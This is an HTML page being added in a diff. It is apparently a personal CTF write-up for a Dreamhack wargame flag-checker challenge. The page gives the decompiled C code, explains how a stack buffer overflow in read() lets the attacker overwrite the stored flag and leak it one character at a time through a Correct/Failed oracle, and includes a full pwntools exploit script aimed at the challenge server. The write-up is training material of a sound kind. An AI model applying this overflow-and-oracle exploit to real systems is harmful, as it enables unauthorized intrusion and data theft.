@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>milkbomb11</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+    <header>
+        <h1>milkbomb11</h1>
+        <a href="/index.html">[to index]</a>
+    </header>
+
+    <main>
+        <p>The problem can be viewed <a href="https://dreamhack.io/wargame/challenges/97">here</a></p>
+        <p>The decompilation is as below</p>
+        <pre><code>
+undefined8 main(void)
+
+{
+  char cVar1;
+  int iVar2;
+  FILE *pFVar3;
+  ssize_t sVar4;
+  long lVar5;
+  ulong uVar6;
+  char *pcVar7;
+  long fs:;
+  byte 0;
+  char acStack_e8 [64];
+  char local_a8 [136];
+  long canary;
+  
+  0 = 0;
+  canary = *(long *)(fs: + 0x28);
+  pcVar7 = acStack_e8;
+  for (lVar5 = 0x32; lVar5 != 0; lVar5 = lVar5 + -1) {
+    *(undefined4 *)pcVar7 = 0;
+    pcVar7 = (char *)((long)pcVar7 + 4);
+  }
+  pFVar3 = fopen("flag","r");
+  if (pFVar3 != (FILE *)0x0) {
+    fgets(local_a8,0x40,pFVar3);
+    fclose(pFVar3);
+    fputs("What\'s the flag? ",stdout);
+    fflush(stdout);
+    sVar4 = read(0,acStack_e8,200);
+    pFVar3 = stdout;
+    uVar6 = 0xffffffffffffffff;
+    pcVar7 = local_a8;
+    do {
+      if (uVar6 == 0) break;
+      uVar6 = uVar6 - 1;
+      cVar1 = *pcVar7;
+      pcVar7 = pcVar7 + (ulong)0 * -2 + 1;
+    } while (cVar1 != '\0');
+    if ((long)(~uVar6 - 1) &lt;= sVar4) {
+      iVar2 = strcmp(acStack_e8,local_a8);
+      if (iVar2 == 0) {
+        fputs("Correct!\n",pFVar3);
+        if (canary != *(long *)(fs: + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+          __stack_chk_fail();
+        }
+        return 0;
+      }
+    }
+    fputs("Failed!\n",pFVar3);
+  }
+                    /* WARNING: Subroutine does not return */
+  exit(1);
+}
+        </code></pre>
+        <p>
+            The key point of the problem is that a massive BOF happens at <code>read</code>, allowing us to manipulate the values in <code>local_a8</code>(where the flag is) and <code>acStack_e8</code>.
+            The strategy I devised was to use brute force to gain the value of the flag, one character at a time. The mechanism is similar to that of blind SQL injection.
+            One caveat though is that if the length of the flag was bigger than 64, this method will not work. Thankfully that wasn't the case this time.
+            We first assume that the length of the flag is 64 bytes long and generate a payload of 62 consecutive 'A's, the character we want to check to see if is right(c1), 
+            NULL terminator, and another 62 consecutive 'A's to corrupt every character until the character we want to check against(c2). If c1 = c2 then the process will return 'Correct!' and exit, additional
+            if not, it will return 'Failed!', from that we can check againts every single ascii character until we find one that results in 'Correct', or we find no character that meets the criteria, in which case the length of
+            the flag is wrong so we continue on with a payload of 61 consecutive A's and so on and so forth. In my first implementation, I added guards to escape the for loop if the program couldn't find a matching character (i.e. a full rotation).
+            but that caused the exploit to not work when the length of the flag was not exactly 64 bytes, since no matches found can be because the length of the flag is shorter, causing the flag to be overwritten with 'A's and always resulting in a non-match.
+        </p>
+        <p>The exploit code is as below.</p>
+        <pre><code>
+#!/usr/bin/python3
+from pwn import *
+
+def gen_payload(i:int, c:bytes, known_parts:bytes) -> bytes:
+    payload = b""
+    for _ in range(i):
+        payload += b"A"
+    payload += c
+    payload += known_parts
+    #payload += b"\x00"
+    while (len(payload) &lt; 64): payload += b"\x00"
+
+    for _ in range(i):
+        payload += b"A"
+    return payload
+
+def ex():
+    context.log_level = "debug"
+    flag = b""
+    for i in range(62, -1, -1):
+        all_ascii =  "!\"#$%&'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
+        for c in all_ascii:
+            #p = process("./checkflag")
+            p = remote("host3.dreamhack.games", 9601)
+            p.sendafter(b"flag? ", gen_payload(i, bytes(c, "ascii"), flag))
+            r = p.recvline()
+            p.close()
+            if b"Correct!" in r: 
+                flag = bytes(c, "ascii") + flag
+                break
+    
+    print(flag)
+
+if __name__ == "__main__": ex()
+        </code></pre>
+    </main>
+</body>
+</html>
